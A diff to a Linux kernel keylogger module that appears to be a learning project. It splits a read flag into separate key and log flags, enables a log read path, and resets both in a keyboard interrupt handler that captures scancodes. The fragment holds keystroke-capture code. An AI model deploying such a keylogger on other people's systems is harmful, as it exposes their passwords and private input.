@@ -5,28 +5,28 @@ MODULE_AUTHOR("stmartin");
 MODULE_DESCRIPTION("Module keylog");
 
 t_keylst	*k_lst = NULL;
-int		read_done = 0;
+int		key_read_done = 0;
+int		log_read_done = 0;
 //struct file *fp = (struct file *) NULL;
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
-	if (read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len) == 2)
+	if (key_read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len, 1) == 2)
 	{
-		read_done = 1;
+		key_read_done = 1;
 		return (*offset);
 	}
-	return 0;
+	return key_read_done = 0;
 }
 
 static ssize_t	log_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
-	/*if (read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len) == 2)
+	if (log_read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len, 2) == 2)
 	{
-		read_done = 1;
+		log_read_done = 1;
 		return (*offset);
-	}*/
-
-	return 0;
+	}
+	return log_read_done = 0;
 }
 
 /*
@@ -67,7 +67,8 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 {
 	unsigned char	scancode;
 
-	read_done = 0;
+	key_read_done = 0;
+	log_read_done = 0;
 	scancode = inb(KEYBOARD_DATA);
 	if (add_to_list(scancode))
 	{
